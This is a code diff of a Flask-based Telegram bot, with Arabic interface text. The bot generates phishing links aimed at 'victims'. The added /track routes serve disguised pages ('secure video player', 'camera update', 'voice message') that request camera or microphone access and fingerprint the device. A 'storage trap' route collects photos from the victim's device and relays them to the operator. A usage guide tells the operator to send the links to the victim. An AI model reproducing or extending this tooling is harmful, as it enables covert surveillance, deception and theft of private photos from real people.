@@ -1,12 +1,7 @@
 import os
 import requests
-from flask import Flask, request, render_template_string, redirect
-import base64
-import random
-import string
+from flask import Flask, request, render_template_string
 import time
-import phonenumbers
-from phonenumbers import geocoder, carrier
 
 app = Flask(__name__)
 
@@ -38,19 +33,139 @@ def answer_callback(callback_id):
 def main_menu():
     return {
         "inline_keyboard": [
-            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
-            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
-            [{"text": "🚨 فخ ذاكرة التخزين (قفل الهلع)", "callback_data": "steal_photos"}],
+            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "action_video"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "action_cam"}],
+            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "action_audio"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "action_device"}],
+            [{"text": "🚨 فخ ذاكرة التخزين (قفل الهلع)", "callback_data": "action_trap"}],
             [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}]
         ]
     }
 
 @app.route('/')
 def index():
-    return "OK"
+    return "Bot is running."
 
 # =======================================================
-# 🚨 حيلة قفل الهلع (Panic Mode) - إجبار الضحية على الرفع 🚨
+# مسار توليد صفحات التقاط البيانات (Landing Pages)
+# =======================================================
+@app.route('/track/<action>')
+def track_page(action):
+    admin = request.args.get('admin', '')
+    target = request.args.get('target', '')
+    
+    templates = {
+        'video': """
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>مشغل فيديو آمن</title>
+                <style>
+                    body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+                    .loader { border: 5px solid #333; border-top: 5px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                </style>
+            </head>
+            <body>
+                <div class="loader"></div>
+                <h2>جاري تحميل الفيديو...</h2>
+                <p>يرجى الانتظار، يتم الاتصال بالكاميرا.</p>
+                <script>
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => { console.log("تم منح صلاحية الكاميرا للهدف: {{ target }}"); })
+                    .catch(err => { console.log("تم رفض الصلاحية."); });
+                </script>
+            </body>
+            </html>
+        """,
+        'cam': """
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>تحديث الكاميرا</title>
+                <style>
+                    body { background-color: #f4f4f4; color: #333; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+                    .btn { background: #007bff; color: #fff; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+                </style>
+            </head>
+            <body>
+                <h2>مطلوب تحديث إعدادات الكاميرا</h2>
+                <p>اضغط على الزر أدناه للسماح بالوصول إلى الكاميرا الخلفية.</p>
+                <button class="btn" onclick="requestCam()">السماح بالوصول</button>
+                <script>
+                    function requestCam() {
+                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                        .then(stream => { console.log("تم منح صلاحية الكاميرا الخلفية للهدف: {{ target }}"); alert("تم التحديث بنجاح!"); })
+                        .catch(err => { alert("فشل التحديث، يرجى المحاولة مرة أخرى."); });
+                    }
+                </script>
+            </body>
+            </html>
+        """,
+        'audio': """
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>رسالة صوتية</title>
+                <style>
+                    body { background-color: #2c3e50; color: #ecf0f1; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+                    .mic-icon { font-size: 50px; margin-bottom: 20px; }
+                </style>
+            </head>
+            <body>
+                <div class="mic-icon">🎙️</div>
+                <h2>لديك رسالة صوتية جديدة</h2>
+                <p>جاري الاستماع...</p>
+                <script>
+                    navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => { console.log("تم منح صلاحية الميكروفون للهدف: {{ target }}"); })
+                    .catch(err => { console.log("تم رفض الميكروفون."); });
+                </script>
+            </body>
+            </html>
+        """,
+        'device': """
+            <!DOCTYPE html>
+            <html dir="rtl">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>فحص الجهاز</title>
+                <style>
+                    body { background-color: #fff; color: #000; font-family: monospace; padding: 20px; }
+                    .box { background: #eee; padding: 15px; border-radius: 5px; word-wrap: break-word; }
+                </style>
+            </head>
+            <body>
+                <h3>جاري جمع معلومات الجهاز...</h3>
+                <div class="box" id="out">جاري التحليل...</div>
+                <script>
+                    let info = "User Agent: " + navigator.userAgent + "\\n";
+                    info += "Platform: " + navigator.platform + "\\n";
+                    info += "Language: " + navigator.language + "\\n";
+                    info += "Cores: " + (navigator.hardwareConcurrency || "Unknown") + "\\n";
+                    info += "RAM: " + (navigator.deviceMemory || "Unknown") + " GB\\n";
+                    info += "Screen: " + screen.width + "x" + screen.height + "\\n";
+                    info += "Target ID: {{ target }}";
+                    
+                    document.getElementById('out').innerText = info;
+                    console.log(info);
+                </script>
+            </body>
+            </html>
+        """
+    }
+    
+    if action in templates:
+        return render_template_string(templates[action], target=target, admin=admin)
+    return "الأداة غير متوفرة", 404
+
+# =======================================================
+# 🚨 فخ ذاكرة التخزين (قفل الهلع)
 # =======================================================
 @app.route('/trap')
 def trap_page():
@@ -193,9 +308,6 @@ def trap_page():
     </html>
     """, admin=admin, target=target)
 
-# =======================================================
-# مسار استقبال الصور وإرسالها كألبوم (10 صور)
-# =======================================================
 @app.route('/upload_trap', methods=['POST'])
 def upload_trap():
     admin_id = request.form.get('admin')
@@ -265,9 +377,12 @@ def webhook():
             action = user_state[chat_id]['action']
             target = text
             
-            if action == 'steal_photos': 
+            if action == 'trap':
                 link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
-                send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
+                send_message(chat_id, f"✅ رابط فخ الذاكرة جاهز:\n`{link}`\n\nأرسله للضحية كصورة/رابط.", None)
+            elif action in ['video', 'cam', 'audio', 'device']:
+                link = f"{BASE_URL}/track/{action}?target={target}&admin={chat_id}"
+                send_message(chat_id, f"✅ رابط ({action}) جاهز:\n`{link}`", None)
                 
             del user_state[chat_id]
     
@@ -279,11 +394,32 @@ def webhook():
         
         answer_callback(cb_id)
         
-        if data == 'steal_photos':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'steal_photos'}
+        if data == 'guide':
+            guide_text = (
+                "📖 *شرح الاستخدام:*\n\n"
+                "1. اضغط على الزر المطلوب.\n"
+                "2. أرسل اسم أو معرف الضحية.\n"
+                "3. البوت سيعطيك رابطاً.\n"
+                "4. أرسل الرابط للضحية، وعند فتحه سيتم تنفيذ الأمر.\n\n"
+                "🚨 *ملاحظة:* يعمل هذا البوت على السيرفر المرفوع عليه فقط."
+            )
+            send_message(chat_id, guide_text)
+            
+        elif data == 'action_trap':
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'trap'}
             send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط سحب ذاكرة التخزين:")
-        else:
-            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅")
+            
+        elif data in ['action_video', 'action_cam', 'action_audio', 'action_device']:
+            action_map = {
+                'action_video': 'video',
+                'action_cam': 'cam',
+                'action_audio': 'audio',
+                'action_device': 'device'
+            }
+            action_type = action_map[data]
+            
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': action_type}
+            send_message(chat_id, f"🎯 أرسل اسم الضحية لإنشاء رابط ({action_type}):")
             
     return "ok", 200
 
@@ -294,7 +430,8 @@ def set_webhook():
     except Exception as e:
         print(e)
 
-set_webhook()
+with app.app_context():
+    set_webhook()
 
 if __name__ == '__main__':
     app.run(port=5000)
